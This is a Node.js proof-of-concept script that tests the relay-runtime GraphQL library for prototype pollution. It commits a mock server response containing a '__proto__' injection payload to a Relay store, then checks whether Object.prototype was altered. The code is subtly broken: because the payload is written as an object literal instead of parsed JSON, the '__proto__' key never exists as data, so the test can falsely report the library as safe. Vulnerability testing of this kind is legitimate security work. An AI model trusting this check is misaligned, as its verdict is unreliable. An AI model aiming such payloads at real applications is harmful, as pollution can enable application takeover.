// PoC: RelayPollution.js
// Setup: npm install relay-runtime graphql
const RelayRuntime = require('relay-runtime');
const {
    createOperationDescriptor,
    Environment,
    Network,
    RecordSource,
    Store
} = RelayRuntime;

// 1. Setup Real Relay Environment
const source = new RecordSource();
const store = new Store(source);
const network = Network.create((operation, variables) => {
    // This represents the malicious server response
    return Promise.resolve({ data: {} });
});
const environment = new Environment({ network, store });

// 2. Define the Malicious Payload
// We simulate a GraphQL response containing a __proto__ injection attempt
const maliciousPayload = {
    user: {
        id: "user-1",
        name: "Normal User",
        // ATTACK VECTOR:
        "__proto__": {
            "polluted": "CRITICAL_VULN_CONFIRMED"
        }
    }
};

// Mocking a simple operation (Request)
const operation = createOperationDescriptor(
    {
        kind: 'Request',
        fragment: {
            kind: 'Fragment',
            name: 'TestQuery',
            type: 'Query',
            argumentDefinitions: [],
            selections: [
                {
                    kind: 'LinkedField',
                    name: 'user',
                    alias: null,
                    storageKey: null,
                    args: null,
                    concreteType: 'User',
                    plural: false,
                    selections: [
                        { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
                        { kind: 'ScalarField', name: 'name', alias: null, args: null, storageKey: null }
                    ]
                }
            ]
        },
        operation: {
            kind: 'Operation',
            name: 'TestQuery',
            argumentDefinitions: [],
            selections: [
                {
                    kind: 'LinkedField',
                    name: 'user',
                    alias: null,
                    storageKey: null,
                    args: null,
                    concreteType: 'User',
                    plural: false,
                    selections: [
                        { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
                        { kind: 'ScalarField', name: 'name', alias: null, args: null, storageKey: null }
                    ]
                }
            ]
        },
        params: {
            name: 'TestQuery',
            operationKind: 'query',
            text: 'query TestQuery { user { id name } }',
            id: null,
            cacheID: 'test-cache-id',
            metadata: {},
            providedVariables: {}
        }
    },
    {} // variables
);

console.log("[*] Committing Malicious Payload to Relay Store...");

// Robust commitPayload resolution
let commitPayload = RelayRuntime.commitPayload;
if (!commitPayload && environment.commitPayload) {
    commitPayload = (env, op, payload) => env.commitPayload(op, payload);
}

if (!commitPayload) {
    console.error("[-] FATAL: commitPayload not found in relay-runtime exports or Environment instance.");
    process.exit(1);
}

try {
    // 3. Execution: Force Relay to process the JSON
    commitPayload(environment, operation, maliciousPayload);

    // 4. Verification
    const testObject = {};
    if (testObject.polluted === "CRITICAL_VULN_CONFIRMED") {
        console.error("\n[!!!] CRITICAL: Prototype Pollution Successful!");
        console.error("[+] Object.prototype was modified by relay-runtime.");
    } else {
        console.log("\n[-] Attack Failed: Object.prototype is clean.");
        console.log("    (Relay likely ignored the __proto__ key or sanitized it)");
    }

} catch (e) {
    console.log("[-] Error during commit (This might mean it's safe):", e.message);
}
